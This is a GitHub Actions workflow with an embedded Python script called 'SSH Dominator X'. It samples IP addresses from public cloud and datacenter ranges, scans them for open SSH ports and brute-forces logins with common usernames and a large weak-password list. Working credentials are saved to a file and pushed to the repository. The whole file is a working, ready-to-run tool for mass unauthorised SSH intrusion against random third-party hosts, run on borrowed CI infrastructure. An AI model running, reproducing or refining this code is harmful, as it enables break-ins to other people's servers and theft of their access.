name: SSH Dominator X – Continuous Hunt

on:
  workflow_dispatch:
    inputs:
      mode:
        description: 'Scan Mode'
        required: true
        default: 'datacenter'
        type: choice
        options:
          - datacenter
          - explorer
          - manual
      datacenter_provider:
        description: 'Datacenter Provider'
        required: false
        default: 'all'
        type: choice
        options:
          - all
          - aws
          - azure
          - gcp
          - digitalocean
          - linode
          - vultr
          - cloudflare
      max_ips:
        description: 'Max IPs per Cycle'
        required: false
        default: '20000'
      scan_range:
        description: 'CIDR Range (explorer)'
        required: false
      test_threads:
        description: 'Async Test Threads'
        required: false
        default: '200'
      timeout:
        description: 'Connection Timeout'
        required: true
        default: '4'
      keywords:
        description: 'Keywords'
        required: false
      min_success:
        description: 'Minimum successes before stopping'
        required: false
        default: '1'

permissions:
  contents: write

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup Git
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"

      - name: Install Libraries
        run: pip3 install rich requests asyncssh

      - name: Run SSH Dominator X
        env:
          MODE: ${{ github.event.inputs.mode }}
          DC_PROVIDER: ${{ github.event.inputs.datacenter_provider }}
          MAX_IPS: ${{ github.event.inputs.max_ips }}
          SCAN_RANGE: ${{ github.event.inputs.scan_range }}
          TEST_THREADS: ${{ github.event.inputs.test_threads }}
          TIMEOUT: ${{ github.event.inputs.timeout }}
          KEYWORDS: ${{ github.event.inputs.keywords }}
          MIN_SUCCESS: ${{ github.event.inputs.min_success }}
        run: |
          python3 << 'PYEOF'
          import os, sys, socket, time, ipaddress, concurrent.futures, random, requests, json, asyncio
          from datetime import datetime
          from pathlib import Path
          from rich.console import Console
          from rich.table import Table
          from rich.panel import Panel
          import asyncssh

          console = Console()
          console.print(Panel.fit("[bold cyan]🔐 SSH Dominator X – Continuous Hunt[/bold cyan]", border_style="cyan"))

          MODE = os.environ["MODE"]
          TIMEOUT = int(os.environ["TIMEOUT"])
          MAX_IPS = int(os.environ.get("MAX_IPS", "20000"))
          DC_PROVIDER = os.environ.get("DC_PROVIDER", "all")
          TEST_THREADS = int(os.environ.get("TEST_THREADS", "200"))
          MIN_SUCCESS = int(os.environ.get("MIN_SUCCESS", "1"))
          SSH_PORT = 22
          MAX_RUNTIME = 5.8 * 3600
          CYCLE_COUNT = 0
          TOTAL_SUCCESSES = 0

          CRED_FILE = "ssh_creds.txt"
          if not os.path.exists(CRED_FILE):
              with open(CRED_FILE, "w") as f:
                  f.write("# IP:PORT:USERNAME:PASSWORD\n")
                  f.write(f"# {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

          scanned_ips_file = Path("cache") / "scanned_ips.txt"
          scanned_ips_file.parent.mkdir(exist_ok=True)
          scanned_ips = set()
          if scanned_ips_file.exists():
              with open(scanned_ips_file) as f:
                  scanned_ips = set(line.strip() for line in f)

          def save_scanned_ips():
              with open(scanned_ips_file, "w") as f:
                  for ip in scanned_ips:
                      f.write(ip + "\n")

          def fetch_fresh_ips():
              targets = []
              if MODE == "datacenter":
                  datacenter_urls = []
                  try:
                      resp = requests.get("https://raw.githubusercontent.com/jhassine/server-ip-addresses/master/data/datacenters.txt", timeout=30)
                      for line in resp.text.splitlines():
                          line = line.strip()
                          if line and not line.startswith("#"):
                              datacenter_urls.append(line)
                  except: pass
                  provider_map = {"aws":"aws","azure":"azure","gcp":"googlecloud","digitalocean":"digitalocean","linode":"linode","vultr":"vultr","cloudflare":"cloudflare"}
                  base_url = "https://raw.githubusercontent.com/rezmoss/cloud-provider-ip-addresses/master/data"
                  for prov in provider_map.values():
                      try:
                          resp = requests.get(f"{base_url}/{prov}-ip-ranges.json", timeout=30)
                          data = resp.json()
                          for item in data.get("prefixes",[]):
                              if "ipv4Prefix" in item:
                                  datacenter_urls.append(item["ipv4Prefix"])
                      except: pass
                  all_ips = set()
                  random.shuffle(datacenter_urls)
                  for cidr in datacenter_urls[:3000]:
                      try:
                          network = ipaddress.IPv4Network(cidr, strict=False)
                          hosts = list(network.hosts())
                          sample_size = min(30, len(hosts))
                          for ip in random.sample(hosts, sample_size):
                              if ip not in scanned_ips:
                                  all_ips.add(str(ip))
                      except: pass
                  targets = list(all_ips)[:MAX_IPS]
                  targets = [ip for ip in targets if ip not in scanned_ips]
              elif MODE == "explorer":
                  scan_range = os.environ.get("SCAN_RANGE","").strip()
                  if scan_range:
                      network = ipaddress.IPv4Network(scan_range, strict=False)
                      targets = [str(ip) for ip in network.hosts() if str(ip) not in scanned_ips][:MAX_IPS]
              elif MODE == "manual":
                  targets_input = os.environ.get("TARGETS_INPUT","").strip()
                  targets = [x.strip() for x in targets_input.split(',') if x.strip() and x.strip() not in scanned_ips][:MAX_IPS]
              return targets

          def scan_ports(targets):
              console.print(f"⚡ Scanning {len(targets)} IPs...")
              ssh_targets = []
              def check_ssh(ip):
                  try:
                      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                      sock.settimeout(0.2)
                      result = sock.connect_ex((ip, SSH_PORT))
                      sock.close()
                      return ip if result == 0 else None
                  except: return None
              with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
                  futures = {executor.submit(check_ssh, ip): ip for ip in targets}
                  for future in concurrent.futures.as_completed(futures):
                      ip = future.result()
                      if ip:
                          ssh_targets.append(ip)
                          scanned_ips.add(ip)
              console.print(f"[green]✅ {len(ssh_targets)} SSH servers found[/green]")
              return ssh_targets

          def gen_usernames(keywords):
              base = ["root","admin","ubuntu","debian","centos","ec2-user","azureuser","vagrant","pi","oracle",
                      "postgres","mysql","tomcat","jenkins","git","web","www","mail","ftp","backup","deploy",
                      "docker","hadoop","spark","hdfs","yarn","user","test","guest","administrator"]
              for kw in keywords:
                  base.extend([kw.lower(), kw.capitalize()])
              return list(set(base))

          def gen_passwords(keywords):
              base = [
                  "123456","password","admin","root","12345678","qwerty","letmein","changeme","secret","toor",
                  "admin123","root123","ubuntu","password123","P@ssw0rd","Admin123!","Qwerty123!","Passw0rd!",
                  "1234","abcd1234","test","guest","user","pass","1q2w3e4r","zaq1xsw2","!QAZ2wsx",
                  "master","access","login","hello","monkey","dragon","123123","abc123","qwerty123",
                  "iloveyou","welcome","batman","superman","princess","sunshine","football","baseball",
                  "hockey","soccer","charlie","michael","andrew","joshua","matthew","ashley","daniel",
                  "jessica","amanda","megan","nicole","thomas","robert","william","james","john",
                  "david","richard","joseph","christopher","steven","kenneth","george","ronald",
                  "123456789","1234567890","password1","password2","admin1","admin2","root1","root2",
                  "default","temp","changeit","newuser","passwd"
              ]
              years = ["2023","2024","2025","2026"]
              specials = ["!","@","#","$","%",""]
              for kw in keywords:
                  kl, kc = kw.lower(), kw.capitalize()
                  for yr in years:
                      for sp in specials:
                          base.extend([f"{kc}{yr}{sp}", f"{kl}{yr}{sp}"])
                  base.extend([kl, kc, f"{kc}123", f"{kl}123", f"{kc}2024", f"{kl}2024", f"{kl}@{yr}"])
                  if len(keywords) > 1:
                      for kw2 in keywords:
                          if kw2 != kw:
                              base.append(kw.lower() + kw2.lower())
                              base.append(kw.capitalize() + kw2.capitalize())
              return list(set(base))

          keys = os.environ.get("KEYWORDS","admin,root,web,server,vps,cloud").split(',')
          usernames = gen_usernames([k.strip() for k in keys])
          passwords = gen_passwords([k.strip() for k in keys])
          console.print(f"[green]📝 {len(usernames)} users | {len(passwords)} passwords[/green]")

          cache_file = Path("cache") / "dominator_x_cache.json"
          cache_file.parent.mkdir(exist_ok=True)
          cache = json.load(open(cache_file)) if cache_file.exists() else {}

          async def test_ssh(ip, username, password):
              cache_key = f"{ip}:{username}:{password}"
              if cache_key in cache:
                  return (ip, username, password, cache[cache_key])
              try:
                  async with asyncssh.connect(ip, port=SSH_PORT, username=username, password=password,
                                              login_timeout=TIMEOUT, known_hosts=None) as conn:
                      await conn.close()
                  cache[cache_key] = "SUCCESS"
                  return (ip, username, password, "SUCCESS")
              except:
                  cache[cache_key] = "FAILED"
                  return (ip, username, password, "FAILED")

          async def test_target(ip):
              local_successes = []
              failed_passwords = set()
              sem = asyncio.Semaphore(TEST_THREADS)
              async def bounded(user, pwd):
                  if pwd in failed_passwords: return
                  async with sem:
                      res = await test_ssh(ip, user, pwd)
                      if res[3] == "SUCCESS":
                          local_successes.append((ip, user, pwd))
                          console.print(f"[green]✅ {ip}: {user}:{pwd}[/green]")
                      else:
                          failed_passwords.add(pwd)
              tasks = [bounded(u, p) for u in usernames for p in passwords]
              await asyncio.gather(*tasks)
              return local_successes

          async def run_cycle(ssh_targets):
              tasks = [test_target(ip) for ip in ssh_targets]
              results = await asyncio.gather(*tasks)
              cycle_successes = []
              for res in results:
                  cycle_successes.extend(res)
              return cycle_successes

          start_time = time.time()
          console.print(f"[bold yellow]🔄 Continuous mode – until {MIN_SUCCESS} success(es) or timeout[/bold yellow]")

          while TOTAL_SUCCESSES < MIN_SUCCESS and (time.time() - start_time) < MAX_RUNTIME:
              CYCLE_COUNT += 1
              targets = fetch_fresh_ips()
              if not targets:
                  console.print("[yellow]⚠️ No fresh IPs. Waiting 30s...[/yellow]")
                  time.sleep(30)
                  continue
              ssh_targets = scan_ports(targets)
              save_scanned_ips()
              os.system(f"git add {scanned_ips_file} && git commit -m 'Update scanned IPs' && git push 2>/dev/null || true")
              if not ssh_targets:
                  continue

              console.print(f"⚡ Testing {len(ssh_targets)} servers with {TEST_THREADS} threads...")
              cycle_successes = asyncio.run(run_cycle(ssh_targets))
              TOTAL_SUCCESSES += len(cycle_successes)

              for ip, user, pwd in cycle_successes:
                  with open(CRED_FILE, "a") as f:
                      f.write(f"{ip}:{SSH_PORT}:{user}:{pwd}\n")
              if cycle_successes:
                  os.system(f"git add {CRED_FILE} && git commit -m 'Found {len(cycle_successes)} creds' && git push 2>/dev/null || true")

              with open(cache_file, "w") as f:
                  json.dump(cache, f)
              os.system(f"git add {cache_file} && git commit -m 'Update cache' && git push 2>/dev/null || true")

              console.print(f"[green]📈 Cycle {CYCLE_COUNT}: {len(cycle_successes)} new, {TOTAL_SUCCESSES} total[/green]")

          # Final report
          if TOTAL_SUCCESSES > 0:
              tbl = Table(title="✅ SSH Credentials Found")
              tbl.add_column("IP", style="cyan")
              tbl.add_column("Port", style="dim")
              tbl.add_column("Username", style="green")
              tbl.add_column("Password", style="yellow")
              with open(CRED_FILE) as f:
                  for line in f.readlines()[2:]:
                      line = line.strip()
                      if not line: continue
                      parts = line.split(':')
                      if len(parts) == 4:
                          tbl.add_row(parts[0], parts[1], parts[2], parts[3])
              console.print(tbl)
          else:
              console.print("[red]❌ No credentials found.[/red]")

          report = "ssh_dominator_report.txt"
          with open(report, "w") as f:
              f.write(f"SSH Dominator X Continuous Hunt\n")
              f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
              f.write(f"Cycles: {CYCLE_COUNT}\nTotal successes: {TOTAL_SUCCESSES}\n")
              f.write("="*60 + "\n")
              with open(CRED_FILE) as creds:
                  f.write(creds.read())
          os.system(f"git add {report} && git commit -m 'Final report' && git push 2>/dev/null || true")
          console.print(f"\n[green]📄 Final report saved[/green]")
          PYEOF
